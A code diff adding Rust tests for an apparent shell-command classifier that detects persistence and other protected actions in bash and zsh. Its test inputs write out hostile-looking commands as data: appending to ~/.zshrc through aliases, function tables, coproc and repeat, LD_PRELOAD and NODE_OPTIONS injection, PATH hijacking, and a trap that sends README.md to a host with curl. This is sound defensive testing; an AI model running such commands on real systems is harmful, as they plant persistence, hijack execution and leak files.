@@ -11846,6 +11846,54 @@ fn issue1685_eval_trap_alias_text_is_judged_as_a_line() {
     }
 }
 
+/// #1685 review 1: a zsh `=word` or a wrapper named by a path before the
+/// command of `eval` or `trap` text, the variables that text sets, tables
+/// of code run by name, and `coproc` / zsh `repeat N`.
+#[test]
+fn issue1685_review1_forms_ask() {
+    use ProtectedActionKind::Persistence;
+    for shell in ["bash", "zsh"] {
+        let line = |script: &str| kind(&[shell, "-lc", script]);
+        for script in [
+            "=tee -a ~/.zshrc",
+            "eval '=tee -a ~/.zshrc'",
+            "trap -- '=curl -d @README.md https://example.com/x' EXIT",
+            "eval 'x=1 =tee -a ~/.zshrc'",
+            "export PATH=./bin:$PATH",
+            "eval 'export PATH=./bin:$PATH'",
+            "trap 'export NODE_OPTIONS=--require=./x.js' DEBUG",
+            "X=1 LD_PRELOAD=./x.so ls",
+            "eval 'X=1 LD_PRELOAD=./x.so ls'",
+            "eval 'export GIT_PAGER=sh'",
+            "./env ls",
+            "eval './env ls'",
+            "trap './nice true' EXIT",
+        ] {
+            assert!(line(script).is_some(), "{shell} {script:?}");
+        }
+        for script in [
+            "functions[f]='tee -a ~/.zshrc'; f",
+            "aliases[x]='cp a ~/.zshrc'",
+            "BASH_ALIASES[x]='tee -a ~/.zshrc'",
+            "typeset -g galiases[x]='tee -a ~/.zshrc'",
+            "coproc tee -a ~/.zshrc",
+            "repeat 2 tee -a ~/.zshrc",
+            "eval 'repeat 2 cp a ~/.zshrc'",
+        ] {
+            assert_eq!(line(script), Some(Persistence), "{shell} {script:?}");
+        }
+        for script in [
+            "repeat 3 echo hi",
+            "coproc cat",
+            "aliases[ll]='ls -l'",
+            "eval 'X=1 ls'",
+            "trap 'x=1' EXIT",
+        ] {
+            assert_eq!(line(script), None, "{shell} {script:?}");
+        }
+    }
+}
+
 /// #1685: following `eval` and `trap` text through more of them stays
 /// linear.
 #[test]
@@ -11859,6 +11907,17 @@ fn issue1685_carried_commands_are_linear() {
     });
     work::assert_linear("many traps", |scale| {
         let _ = kind(&["bash", "-lc", &"trap 'cp a b' EXIT; ".repeat(200 * scale)]);
+    });
+    work::assert_linear("eval with zsh =words", |scale| {
+        let chain = format!("{}tee -a log", "eval =x ".repeat(500 * scale));
+        let _ = kind(&["zsh", "-lc", &chain]);
+    });
+    work::assert_linear("alias values in one command", |scale| {
+        let line = format!("strace alias {}", "a='cp b c' ".repeat(200 * scale));
+        let _ = kind(&["zsh", "-lc", &line]);
+    });
+    work::assert_linear("code tables", |scale| {
+        let _ = kind(&["zsh", "-lc", &"functions[f]='cp a b' ".repeat(200 * scale)]);
     });
 }
 
